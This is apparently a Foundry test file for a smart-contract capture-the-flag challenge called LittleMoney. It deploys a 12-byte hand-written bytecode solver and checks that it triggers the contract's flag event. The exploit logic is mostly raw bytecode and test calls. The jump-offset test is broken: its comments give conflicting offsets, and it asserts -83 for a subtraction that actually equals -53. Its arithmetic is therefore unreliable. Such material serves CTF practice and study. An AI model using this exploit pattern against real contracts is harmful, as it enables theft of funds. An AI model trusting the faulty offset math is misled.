// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/contracts/LittleMoney.sol";
import "../src/contracts/LittleMoneyExploit.sol";

contract LittleMoneyTest is Test {
    LittleMoney public instance;
    LittleMoneyExploit public exploit;

    event SendFlag(address indexed sender);

    function setUp() public {
        instance = new LittleMoney();
        exploit = new LittleMoneyExploit();

        // Set msg.value to 1 wei
        vm.deal(address(this), 1);
        vm.deal(address(exploit), 1);
    }

    function testInitialState() public {
        // Deployer is owner so calling payforflag with 1 wei should work
        instance.payforflag{value: 1}();
    }

    function testExploitJumpOffsets() public {
        // Verify the bytecode addresses for renounce and payforflag
        // These should be at 0x22a and 0x1f5 respectively
        // The required offset is -0xcb (0xffffff35 in two's complement)
        
        uint256 offset = 0x1f5;
        uint256 targetAddr = 0x22a;
        int256 diff = int256(offset) - int256(targetAddr);
        
    // Should be -83 (0xffffffad) for current layout
    assertEq(diff, -83);
    }

    function testMinimalBytecodeSize() public {
        // Verify the exploit contract is <= 12 bytes
        address solver;
        bytes memory runtime = hex"436000523a316020526040fd";
        assembly { solver := create(0, add(runtime, 0x20), mload(runtime)) }
        uint256 size = address(solver).code.length;
        assertLe(size, 12, "Exploit bytecode exceeds 12 byte limit");
    }

    function testExploitSucceeds() public {
        // Deploy the minimal solver runtime (Yul) and fund gasprice balance
        address solver;
    bytes memory runtime = hex"436000523a316020526040fd";
        assembly { solver := create(0, add(runtime, 0x20), mload(runtime)) }

        address gasPriceAddress = 0x000000000000000000000000000000003B9aCA00;
        vm.deal(gasPriceAddress, 4294967243);

        // Expect SendFlag event to be emitted with solver as the sender
        vm.expectEmit(true, false, false, false);
        emit SendFlag(solver);
        vm.prank(solver);
        instance.execute(solver);
    }

    function testCompleteChallenge() public {
        // Completeness is validated by emitting the SendFlag event above
    }
}
